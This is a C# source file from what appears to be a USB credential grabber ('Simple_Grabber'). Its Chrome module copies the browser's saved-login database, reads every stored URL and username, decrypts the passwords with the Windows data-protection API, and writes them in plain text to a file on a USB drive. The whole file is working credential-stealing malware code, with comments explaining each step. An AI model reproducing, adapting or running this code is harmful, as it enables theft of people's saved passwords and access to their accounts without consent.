using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Dapper;


namespace Simple_Grabber.Modules
{
    public class User
    {
        public string ActionUrl { get; set; }

        public string UsernameValue { get; set; }

        public byte[] PasswordValue { get; set; }
    }

    public class Chrome
    {
        // Default file path for the database

        private static readonly string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
        
        // Get the entries within the database

        private static StringBuilder GetDatabaseEntries()
        {
            var databaseEntries = new StringBuilder();
            
            // Create a copy of the database - Chrome has the original database open and is therefore locked

            if(File.Exists(FolderPath + @"\Login Data Copy"))
            {
                File.Delete(FolderPath + @"\Login Data Copy");

                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
            }

            else
            {
                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
            }

            using (var connection = new SQLiteConnection("Data Source=" + FolderPath + @"\Login Data Copy"))
            {
                // Query used to get the database entries

                const string statement = "SELECT action_url, username_value, password_value FROM logins";

                // Open the database

                connection.Open();

                // Build a list of objects from the database query

                var users = connection.Query<User>(statement);

                foreach (var user in users)
                {
                    // Decrypt the password

                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.PasswordValue, null, DataProtectionScope.CurrentUser));

                    databaseEntries.AppendLine($"{user.ActionUrl} : {user.UsernameValue} : {decryptedPassword}");
                }
            }

            // Delete the database copy

            File.Delete(FolderPath + @"\Login Data Copy");

            return databaseEntries;
        }

        // Write the entries to a file

        public static void WriteToFile(string usbPath)
        {
            var databaseEntries = GetDatabaseEntries();

            if (!File.Exists(usbPath + @"Data\Chrome.txt"))
            {
                File.Create(usbPath + @"Data\Chrome.txt");
            }

            File.WriteAllText(usbPath + @"Data\Chrome.txt", databaseEntries.ToString());    
        }
    }
}
